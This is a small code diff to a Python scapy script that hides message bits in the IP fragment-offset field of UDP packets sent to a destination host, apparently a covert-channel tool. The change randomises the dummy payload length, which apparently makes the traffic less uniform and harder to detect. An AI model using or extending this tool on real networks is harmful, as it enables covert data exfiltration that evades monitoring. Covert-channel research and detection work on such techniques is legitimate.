@@ -1,5 +1,6 @@
 import os
 import time
+import random
 import argparse
 from scapy.all import IP, UDP, send
 
@@ -19,7 +20,8 @@ def send_covert_data(dest_ip, dest_port, message, delay, key, bits_per_packet):
 
     for i, chunk in enumerate(chunks):
         frag_val = encode_bits_in_frag(chunk, key, bits_per_packet)
-        payload = os.urandom(8)
+        payload_len = random.randint(4, 16)
+        payload = os.urandom(payload_len)
         packet = IP(dst=dest_ip, flags="MF", frag=frag_val) / UDP(sport=4444, dport=dest_port) / payload
         send(packet, verbose=0)
         time.sleep(delay)
